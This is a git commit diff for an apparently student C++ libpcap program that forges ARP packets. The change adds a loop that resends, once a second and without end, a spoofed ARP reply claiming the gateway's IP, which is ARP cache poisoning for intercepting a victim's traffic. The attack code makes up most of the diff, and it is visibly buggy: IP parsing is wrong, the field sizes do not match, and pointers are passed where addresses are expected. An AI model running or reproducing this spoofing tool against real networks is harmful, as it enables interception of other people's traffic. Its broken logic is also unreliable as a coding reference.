0eba398a96137cf76d4a9d81aa749e81994f2929
yujin <yujin5836@gmail.com>
2019-08-08 18:10:44 +0900

    arp_feature done

--- main.cpp
+++ main.cpp
@@ -4,6 +4,7 @@
 #include <cstring>
 #include "PHeader.h"
 #include <string.h>
+#include <zconf.h>
 
 #define Request 0x0001
 #define Reply 0x0002
@@ -53,19 +54,18 @@ void make_sender_packet(struct combine_packet* compacket, u_char* sArr){
 
     }
 
-    //printf("\n");
 
     uint8_t sss[6] = {0,0,0,0,0,0};
     memcpy(compacket->arp.target_mac_ad, sss, 6);// 아무값이나 상과없음?
 
 
-    printf("broadcast _ send arp ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
+
+    for(i=0;i<6;i++) // arp_sender_mac_ad 값 저장
+    {
+        compacket->arp.target_ip_ad[i] = sArr[i]; // 아무값이나 상관없음
+    }
 
 
-
-    printf("done^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
-
- //   printf("@@@@@@@@@@@@@@@@@@@\n");
 
 
 }
@@ -96,7 +96,10 @@ void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_
     int i=0;
     u_char temp[] = {0,0,0,0,0,0};
     char mac[6];
+
+
     get_target_mac((int8_t*) compacket,mac);
+
 
     for(i=0;i<6;i++)
     {
@@ -127,6 +130,9 @@ void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_
     {compacket->arp.send_ip_ad[i] = gateway_ip[i];}
 
 
+
+
+
     for(i=0;i<6;i++)
     {compacket->arp.target_mac_ad[i] = mac[i];}
 
@@ -136,7 +142,6 @@ void make_attacker_packet(struct combine_packet* compacket, u_char* sender_ip,u_
 
 
 }
-
 
 
 int main(int argc, char* argv[]) {
@@ -149,22 +154,19 @@ int main(int argc, char* argv[]) {
     int res;
     char *dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    struct combine_packet attacker_packet;
 
-    //char* gateway_ip = argv[3];
 
     int i = 0;
     // 두번째 친구 읽어옴
     char *gateway_ip = argv[3];
+    char sArr[4] = {0,};
+    char* sender_ip = strtok(argv[2], "."); //공백을 기준으로 문자열 나눔
 
-
-    char *sArr[10] = {NULL,};
-    char *sender_ip = strtok(argv[2], " "); //공백을 기준으로 문자열 나눔
     //TODO sender_ip를 패킷에 넣어줄 것
 
     while (sender_ip != NULL)  // 공백이 나올때까지 계속 문자열을 자름
     {
-        sArr[i] = sender_ip;
+        sArr[i] = (u_char)sender_ip[i];
         i++;
 
         sender_ip = strtok(NULL, " ");
@@ -174,34 +176,10 @@ int main(int argc, char* argv[]) {
     printf("=======================\n");
 
 
-    for (int i = 0; i < 10; i++) {
-        if (sArr[i] != NULL)           // 문자열 포인터 배열의 요소가 NULL이 아닐 때만
-            printf("%s\n", sArr[i]);   // 문자열 포인터 배열에 인덱스로 접근하여 각 문자열 출력
-    }
+
+    make_sender_packet(&compacket, (u_char *)sArr); // broadcast로 보내는 패킷
 
 
-
-
-    printf("\n=======================\n");
-
-
-    printf("0000000000000\n");
-
-    printf("sender = %s ", sender_ip);
-    printf("\n0000000000000\n");
-
-
-
-
-    //return 0;
-
-    //char* gateway_ip = argv[3];
-
-    make_sender_packet(&compacket, (u_char *) sArr); // broadcast로 보내는 패킷
-
-
-
-    //return 0;
     /*
     if (argc != 4)  // 오류처리
     {
@@ -222,7 +200,6 @@ int main(int argc, char* argv[]) {
  *
  * */
 
-    //printf("11111111111^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
 
     // make_sender_packet(&compacket,(u_char*)sender_ip); // broadcast로 보내는 패킷
     uint8_t buf[42];
@@ -251,12 +228,12 @@ int main(int argc, char* argv[]) {
     }
         printf(" \n========while DONE==============\n");
 
-    make_attacker_packet(&compacket,(u_char*) sender_ip,(u_char*) gateway_ip );
+    make_attacker_packet(&compacket,(u_char*)&sender_ip,(u_char*)&gateway_ip );
 
-
-    pcap_sendpacket(handle,(const u_char*)&packet, 42);
-
-
+    while(true) {
+        pcap_sendpacket(handle, (const u_char *) &packet, 42);
+        sleep(1);
+    }
     // 여기서부터 공격입니다 열심히 하세요77
 
     // 공격 패킷 만들기 전 작업
